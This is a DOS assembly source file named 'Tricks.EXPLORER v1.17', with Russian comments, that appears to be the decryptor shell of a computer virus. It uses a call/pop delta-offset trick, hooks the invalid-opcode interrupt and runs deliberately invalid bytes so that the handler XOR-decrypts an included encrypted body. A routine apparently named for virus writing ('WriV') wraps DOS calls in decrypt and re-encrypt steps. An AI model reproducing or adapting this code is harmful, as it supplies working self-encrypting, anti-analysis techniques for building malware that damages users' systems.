;************************************************
;*	Tricks.EXPLORER v1.17                   *
;************************************************
.286
TestS	segment
	assume	cs:TestS,ds:TestS,ss:TestS
	org	100h
;
Shift	= ((Next-Start)+100h)	
CryptLen= CopyRT-Crypted
;
Start:
	call	Next
Next:
	pop	si
	sub	si,Shift
	call	Crypt	
;
Crypted:
;************************************************
	include	trexp.inc ; Зашифровано         *
;************************************************
CopyRT	db	0,'[Tricks.EXPLORER] v1.17',0
;
WriV:
	call	Crypt
	int	21h
	call	Crypt
	ret
;************************************************
;*	Расшифровщик                            * 
;************************************************
Point:
	add	sp, 6
	pusha
	mov	al, 055h
	lea	bx, Crypted[si]
	mov	cx, CryptLen
Circle:	
	xor	byte ptr [bx], al
	inc	bx
	loop	Circle
	popa
	ret
Crypt:
	mov	ax, 2506h
	lea	dx, Point[si]
	int	21h
	db	0FFh, 0FFh, 0FFh
;
Finish:
;
Tests	ends
	End	Start
				